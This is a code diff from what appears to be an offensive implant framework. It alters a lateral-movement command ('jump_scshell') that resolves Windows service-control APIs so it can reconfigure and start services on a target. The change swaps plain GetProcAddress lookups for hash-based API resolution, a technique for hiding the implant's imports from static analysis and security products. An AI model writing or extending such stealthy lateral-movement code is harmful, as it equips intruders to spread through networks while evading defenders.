@@ -52,23 +52,23 @@ auto declfn starburst::cmd_jump_scshell(
     }
 
     auto pOpenSCManagerW = reinterpret_cast<fnOpenSCManagerW>(
-        inst.kernel32.GetProcAddress( h_advapi,
-            symbol<char*>( const_cast<char*>( "OpenSCManagerW" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_advapi ),
+            expr::hash_string( "OpenSCManagerW" ) ) );
     auto pOpenServiceW = reinterpret_cast<fnOpenServiceW>(
-        inst.kernel32.GetProcAddress( h_advapi,
-            symbol<char*>( const_cast<char*>( "OpenServiceW" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_advapi ),
+            expr::hash_string( "OpenServiceW" ) ) );
     auto pChangeServiceConfigW = reinterpret_cast<fnChangeServiceConfigW>(
-        inst.kernel32.GetProcAddress( h_advapi,
-            symbol<char*>( const_cast<char*>( "ChangeServiceConfigW" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_advapi ),
+            expr::hash_string( "ChangeServiceConfigW" ) ) );
     auto pStartServiceW = reinterpret_cast<fnStartServiceW>(
-        inst.kernel32.GetProcAddress( h_advapi,
-            symbol<char*>( const_cast<char*>( "StartServiceW" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_advapi ),
+            expr::hash_string( "StartServiceW" ) ) );
     auto pQueryServiceConfigW = reinterpret_cast<fnQueryServiceConfigW>(
-        inst.kernel32.GetProcAddress( h_advapi,
-            symbol<char*>( const_cast<char*>( "QueryServiceConfigW" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_advapi ),
+            expr::hash_string( "QueryServiceConfigW" ) ) );
     auto pCloseServiceHandle = reinterpret_cast<fnCloseServiceHandle>(
-        inst.kernel32.GetProcAddress( h_advapi,
-            symbol<char*>( const_cast<char*>( "CloseServiceHandle" ) ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_advapi ),
+            expr::hash_string( "CloseServiceHandle" ) ) );
 
     if ( !pOpenSCManagerW || !pOpenServiceW || !pChangeServiceConfigW ||
          !pStartServiceW || !pQueryServiceConfigW || !pCloseServiceHandle ) {
